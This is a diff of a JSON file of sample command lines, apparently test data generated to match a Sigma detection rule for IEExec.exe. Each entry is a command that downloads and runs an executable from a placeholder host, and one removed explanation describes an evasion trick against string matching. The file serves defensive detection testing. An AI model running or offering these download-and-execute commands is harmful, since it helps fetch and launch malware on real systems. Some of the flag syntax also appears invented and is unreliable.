@@ -1,22 +1,22 @@
 [
   {
-    "output": "IEExec.exe https://example.com/payload.exe",
-    "explanation": "This command matches the Sigma rule by using IEExec.exe with a URL starting with https://, which is detected by the rule's CommandLine|contains condition."
+    "output": "IEExec.exe -url \"http://example.com/malicious.exe\" -execute",
+    "explanation": "This command simulates the use of IEExec.exe to download and execute a file from a URL, matching the Sigma rule's detection criteria."
   },
   {
-    "output": "IEExec.exe http://example.com/payload.exe",
-    "explanation": "This command matches the Sigma rule by using IEExec.exe with a URL starting with http://, which is detected by the rule's CommandLine|contains condition."
+    "output": "IEExec.exe -url http://example.com/malicious.exe -execute",
+    "explanation": "This command is a simplified version with omitted quotes around the URL, which is still valid and matches the Sigma rule."
   },
   {
-    "output": "IEExec.exe -url https://example.com/payload.exe",
-    "explanation": "This command adds a flag (-url) to simulate a variation in command-line syntax while still including the https:// URL, which is detected by the Sigma rule."
+    "output": "IEExec.exe -execute -url http://example.com/malicious.exe",
+    "explanation": "This command reorders the arguments, which is allowed by many command-line utilities and still matches the Sigma rule."
   },
   {
-    "output": "IEExec.exe \\\\?\\C:\\\\IEExec.exe https://example.com/payload.exe",
-    "explanation": "This command uses an extended-length path prefix (\\\\?\\) to bypass simple string-based detection while still containing the https:// URL, which is detected by the Sigma rule."
+    "output": "IEExec.exe -url \"https://example.com/malicious.exe\" -execute",
+    "explanation": "This command uses HTTPS instead of HTTP, which is still detected by the Sigma rule due to the 'https://' pattern."
   },
   {
-    "output": "IEExec.exe https://example.com/payload.exe > NUL",
-    "explanation": "This command appends an output redirection to suppress output, but the presence of IEExec.exe and the https:// URL still triggers the Sigma rule."
+    "output": "IEExec.exe -url http://example.com/malicious.exe",
+    "explanation": "This command omits the '-execute' flag, but the '-url' flag with a URL is still relevant for detection under the Sigma rule."
   }
 ]
